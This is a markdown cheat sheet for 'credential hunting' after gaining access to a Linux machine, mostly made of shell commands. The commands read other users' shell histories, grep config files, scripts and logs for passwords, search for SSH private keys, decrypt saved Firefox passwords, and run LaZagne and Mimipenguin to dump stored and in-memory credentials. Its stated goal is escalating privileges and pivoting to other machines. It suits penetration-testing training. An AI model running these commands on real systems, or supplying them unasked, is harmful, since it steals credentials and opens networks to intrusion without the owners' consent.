# Linux Credential Hunting (Pillaging)
**Concept:** Users and Admins are lazy. They reuse passwords, hardcode credentials in scripts, and leave secrets in cleartext config files. 
**Goal:** Find these secrets to escalate privileges or pivot.
## 1. The Low Hanging Fruit (History & Env)
**Check First:** Before running noisy `find` commands, check the immediate environment.
### Shell History
**Context:** Admins often type passwords into the CLI (e.g., `mysql -pPassword123`) or paste credentials by accident.
```shell
# Check current user's history
cat ~/.bash_history
cat ~/.zshrc_history
grep -i "pass" ~/.bash_history

# Check ALL users' history (If you have read access to /home)
tail -n 20 /home/*/.bash_history
```
### Environment Variables
**Context:** Docker containers and cloud instances often pass secrets via ENV vars.
```shell
env | grep -iE "pass|key|secret|token"
```
## 2. File System Enumeration (Grep is King)
**Goal:** Find configuration files, scripts, or backups containing keywords.
### Configuration Files
**Context:** Apps like WordPress (`wp-config.php`) or database clients save creds here.
```shell
# Search specific extensions for "user/pass" keywords
# 2>/dev/null hides "Permission Denied" errors
grep -rnE "user|password|pass" . --include=*.{conf,config,xml,ini,json,yaml} 2>/dev/null | grep -v "lib\|fonts\|share\|core"
```
### Scripts & Source Code
**Context:** Developers hardcode credentials in automation scripts (`.py`, `.sh`, `.pl`).
```shell
# Find scripts and grep inside them
grep -rnE "user|password|pass" /opt /var/www /home --include=*.{py,sh,pl,php,js} 2>/dev/null
```
### Database Files
**Context:** SQLite databases often store app data in single files.
```shell
# Find DB files
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null
```
## 3. SSH Keys (The Golden Ticket)
**Goal:** Find private keys (`id_rsa`) to SSH into other boxes or even back into localhost as root.
```shell
# Search for Private Keys (Recursively)
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null

# Search for Authorized Keys (To see who can log in here)
grep -rnw "ssh-rsa" /home/* 2>/dev/null
```
## 4. Browser Forensics (Firefox)
**Context:** Users save passwords in browsers. If you are on a workstation (not just a server), this is high-value. 
**Location:** `~/.mozilla/firefox/<profile_folder>/`
### Manual Extraction (Firefox Decrypt)
**Tool:** `firefox_decrypt.py` (Needs to be uploaded to target or profile downloaded to attacker).
```shell
# 1. Locate the profile
ls -la ~/.mozilla/firefox/

# 2. Run the tool against the profile
python3 firefox_decrypt.py ~/.mozilla/firefox/xy123.default

# Output:
# Website:   https://internal-admin.corp
# User:      admin
# Pass:      SuperSecret123!
```
## 5. Automated Tools (Lazy Way)
**Note:** These tools are "noisy" and may trigger AV/EDR.
### LaZagne (Python)
**Scope:** Browsers, Git, SVN, Wifi, Databases, Sysadmin tools.
```shell
# Download and run (Standalone binary recommended if Python missing)
python3 laZagne.py all
```
### Mimipenguin (Requires Root)
**Scope:** Dumps cleartext passwords from memory (Gnome Keyring, vsftpd, apache), similar to Mimikatz on Windows.
```shell
# Must be run as root/sudo
sudo python3 mimipenguin.py
```
## 6. System Logs
**Context:** Services log authentication failures, and sometimes (misconfigured) successes with passwords.

| **Log File**                      | **Description**                                                 |
| ----------------------------- | ----------------------------------------------------------- |
| `/var/log/auth.log`           | SSH/Sudo logs (Debian/Ubuntu). **Check for sudo commands.** |
| `/var/log/secure`             | Authentication logs (RHEL/CentOS).                          |
| `/var/log/apache2/access.log` | Web server access. Check for credentials in GET parameters. |
| `/var/log/syslog`             | Generic system activity.                                    |
```shell
# Search logs for "password" or "failed"
grep -rE "password|failed|success" /var/log/ 2>/dev/null
```